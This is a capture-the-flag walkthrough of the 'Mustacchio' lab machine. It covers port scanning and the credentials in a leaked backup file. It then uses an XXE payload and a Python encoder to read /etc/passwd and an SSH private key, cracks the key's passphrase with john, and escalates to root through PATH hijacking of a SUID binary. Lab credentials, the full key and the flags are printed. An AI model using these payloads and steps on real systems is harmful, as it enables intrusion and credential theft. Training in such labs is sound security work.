# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 80 | http |
| 8765 | http |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
| 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
| 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
| http-methods:
|_ Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

Let's begin by visiting the `port 80` website:



![Pasted image 20250317181844.png](../../IMAGES/Pasted%20image%2020250317181844.png)

Let's do a simple fuzzing:

![Pasted image 20250317181923.png](../../IMAGES/Pasted%20image%2020250317181923.png)

We can see a `custom` directory, let's take a look:

![Pasted image 20250317181943.png](../../IMAGES/Pasted%20image%2020250317181943.png)

![Pasted image 20250317181952.png](../../IMAGES/Pasted%20image%2020250317181952.png)

Got an `users.bak` file, we can browse this file using `sqlitebrowser`:


![Pasted image 20250317182139.png](../../IMAGES/Pasted%20image%2020250317182139.png)

![Pasted image 20250317182342.png](../../IMAGES/Pasted%20image%2020250317182342.png)

```
admin:bulldog19
```

Got credentials for admin, let's take a look at the other port since this contains a login page:

![Pasted image 20250317182405.png](../../IMAGES/Pasted%20image%2020250317182405.png)

Now we are inside the admin panel, we got a site in which we can add comments to the website, if we check source code, we find this:

![Pasted image 20250317182739.png](../../IMAGES/Pasted%20image%2020250317182739.png)

We got two important things, first, a path to a cookie, and an username:

```
/auth/dontforget.bak
barry
```

If we go to the cookie route, we can download the file, let's analyze it with `sqlitebrowser` too:


![Pasted image 20250317183024.png](../../IMAGES/Pasted%20image%2020250317183024.png)

Not some interesting info aside from noticing that this goes in the `xml` format, let's begin exploitation.


# EXPLOITATION
---

Let's send a simple request and check the format of it:


![Pasted image 20250317183500.png](../../IMAGES/Pasted%20image%2020250317183500.png)

My guess is that since this reads from a `xml` file, it could be vulnerable to XXE, also, we can try crafting a payload to read `/etc/passwd`, we can use this python script to convert the payload into url encoding:


```python
import urllib.parse
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment><name>&xxe;</name><author>test</author><comment>test</comment></comment>'''
print(urllib.parse.quote(payload))
```

Now, let's use it and copy the payload:


```python
python3 convert.py

%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A///home/barry/.ssh/id_rsa%22%3E%20%5D%3E%0A%3Ccomment%3E%3Cname%3E%26xxe%3B%3C/name%3E%3Cauthor%3Etest%3C/author%3E%3Ccomment%3Etest%3C/comment%3E%3C/comment%3E
```



If we use the payload:


![Pasted image 20250317183744.png](../../IMAGES/Pasted%20image%2020250317183744.png)

And there we go, we got LFI through exploiting this vulnerable parameter, we already know about `barry` and that we can login using his key, let's read the key:

![Pasted image 20250317183859.png](../../IMAGES/Pasted%20image%2020250317183859.png)

Let's grab the key and login as barry:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

If we try logging using the key we notice it is encrypted, which means we need the passphrase, for this, let's try cracking it using `ssh2john`:

```
ssh2john id_rsa > id_hash.txt
```

Now, let's crack it:

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_hash.txt
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2025-03-17 23:42) 0.2688g/s 3855Kp/s 3855Kc/s 3855KC/sa6_123..*7¡Vamos!
Session completed
```

Got the passphrase:

```
urieljames
```

We can now log into ssh with it:


![Pasted image 20250317184506.png](../../IMAGES/Pasted%20image%2020250317184506.png)

Let's start privilege escalation.



# PRIVILEGE ESCALATION
---

Let's find SUID binaries with root permissions:

```
barry@mustacchio:~$ find / -perm -4000 2>/dev/null

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```


Found something interesting, we got `/home/joe/live_log`, if we use strings to analyze it. we can find this:

![Pasted image 20250317185702.png](../../IMAGES/Pasted%20image%2020250317185702.png)

This binary runs `tail -f /var/log/nginx/access.log` using a **relative path** (`tail` instead of`/usr/bin/tail`).

We can hijack the`tail` command by creating a malicious script named`tail` in a directory we control and prepend that directory to the`PATH`.

Since this is owned by root, we can escalate our privileges into root by doing this:


```
echo '/bin/bash -p' > /tmp/tail
chmod +x /tmp/tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

We get this:

![Pasted image 20250317185813.png](../../IMAGES/Pasted%20image%2020250317185813.png)

And we got root access, let's read both flags:


```
root@mustacchio:~# cat /home/barry/user.txt
62d77a4d5f97d47c5aa38b3b2651b831
```

```
root@mustacchio:~# cat /root/root.txt
3223581420d906c4dd1a5f9b530393a5
```

![Pasted image 20250317185906.png](../../IMAGES/Pasted%20image%2020250317185906.png)

